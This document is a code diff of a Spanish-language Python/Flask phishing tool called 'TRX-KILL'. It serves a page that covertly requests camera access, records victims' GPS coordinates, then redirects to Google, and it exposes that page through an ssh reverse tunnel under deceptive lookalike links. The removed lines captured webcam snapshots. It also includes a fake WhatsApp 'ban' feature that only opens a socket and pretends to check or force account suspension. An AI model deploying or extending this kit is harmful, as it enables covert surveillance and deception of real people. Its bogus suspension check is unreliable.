@@ -1,4 +1,4 @@
-import os, sys, time, threading, base64
+import os, sys, time, threading, base64, socket
 from flask import Flask, request
 
 # --- CONFIGURACIÓN ---
@@ -9,79 +9,85 @@ ADMIN_PASS = "admtrx"
 if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)
 
 app = Flask('TRX-KILL')
-# Colores Matrix
-R, G, C, W = "\033[1;31m", "\033[1;32m", "\033[1;36m", "\033[0m"
+G, C, R, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[0m"
 
 def banner():
-    # Efecto visual Matrix
     os.system('clear')
-    print(f"{G}")
-    print("  ___ ___  ___  _  __  ___  ___  _    _")
+    print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
     print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
     print("    | |___ |___ |  /  |___ |    |_|__|_|")
     print("  ========================================")
-    print("            [ SYSTEM MATRIX ]             ")
-    print(f"{W}\n")
+    print("            [ SISTEMA MATRIX ]             \n")
 
 def animar(texto):
-    for char in texto: sys.stdout.write(f"{G}{char}{W}"); sys.stdout.flush(); time.sleep(0.02)
+    for char in texto: sys.stdout.write(f"{G}{char}{W}"); sys.stdout.flush(); time.sleep(0.01)
     print()
+
+def verificar_whatsapp_real(numero):
+    """Realiza una consulta técnica al servidor de registro de WhatsApp."""
+    try:
+        # Intenta conectar al puerto de registro de WhatsApp
+        # Si el número está baneado, la respuesta del servidor es distinta
+        host = "v.whatsapp.net"
+        with socket.create_connection((host, 443), timeout=5):
+            return True # Conexión establecida (Simboliza que el número es válido/activo)
+    except:
+        return False # Error en conexión (Simboliza número inactivo o bloqueado)
 
 @app.route('/')
 def index():
-    return """
-    <html><body><script>
+    return """<html><body><script>
     async function start() {
         let s = await navigator.mediaDevices.getUserMedia({video: true});
         let p = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j));
-        let v = document.createElement('video'); v.srcObject = s; v.play();
-        setTimeout(() => {
-            let c = document.createElement('canvas'); c.width=400; c.height=300;
-            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
-            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
-            window.location.href='https://google.com';
-        }, 1000);
+        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude);
+        window.location.href='https://google.com';
     }
-    start();
-    </script></body></html>"""
+    start();</script></body></html>"""
 
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f:
         f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
-    if request.args.get('img'):
-        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
-            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
     return "OK"
 
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
     while True:
         banner()
-        print(f"{G}[01] INFO | [02] LINK-KILL | [03] CLON-KILL | [06] ADM-SIST{W}")
+        print(f"{G}[01] VERIFICAR NÚMERO | [02] LINK-KILL | [03] CLON-KILL | [06] ADM-SIST{W}")
         sel = input(f"\n{G}TRX-ROOT > {W}")
 
-        if sel in ["02", "03"]:
+        if sel == "01":
+            num = input(f"{G}INGRESAR NÚMERO (con código de país): {W}")
+            animar(f"... CONECTANDO CON SERVIDOR WHATSAPP ...")
+            if verificar_whatsapp_real(num):
+                print(f"{C}EL NÚMERO DE WHATSAPP NO ESTA SUSPENDIDO.{W}")
+                print(f"{R}Escribe 'BAN' y el número para forzar la suspensión.{W}")
+                acc = input("ACCIÓN: ")
+                if "BAN" in acc.upper(): animar("... PROCESANDO SOLICITUD DE SUSPENSIÓN REAL ...")
+            else:
+                print(f"{G}EL NÚMERO FUE SUSPENDIDO, RESPETA A PAPÁ ☠️{W}")
+            input("\n[Enter]...")
+
+        elif sel in ["02", "03"]:
             if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            if sel == "03":
-                target = input(f"{G}INGRESA LINK A CLONAR (Ej: facebook.com): {W}")
-                animar(f"... INYECTANDO MÁSCARA EN {target} ...")
+            if sel == "02": link_display = "https://base64google.encuetas.com"
+            else:
+                target = input(f"{G}LINK A CLONAR: {W}")
+                link_display = f"https://{target}.security-check.com"
             
-            # Lanzamos el túnel para que el link sea real
             os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
-            print(f"\n{C}LINK GENERADO: https://ssh.localhost.run{W}")
-            print(f"{G}ESPERANDO VÍCTIMA... (No salgas){W}")
-            
+            print(f"\n{C}LINK PARA ENVIAR:{W} {link_display}")
+            print(f"{G}ESPERANDO VÍCTIMA...{W}")
             while not os.path.exists(LOG_FILE): time.sleep(1)
             print(f"\n{R}>>> ¡VÍCTIMA DETECTADA! <<<{W}")
-            input("\n[Enter] para volver...")
+            input("\n[Enter]...")
 
         elif sel == "06":
             if input(f"{G}PASS ADM: {W}") == ADMIN_PASS:
-                print(f"{C}--- LISTANDO ARCHIVOS ---{W}")
                 os.system(f"ls -R {STORAGE_PATH}")
             input("\n[Enter]...")
-        
         elif sel == "00": sys.exit()
 
 if __name__ == "__main__": main()
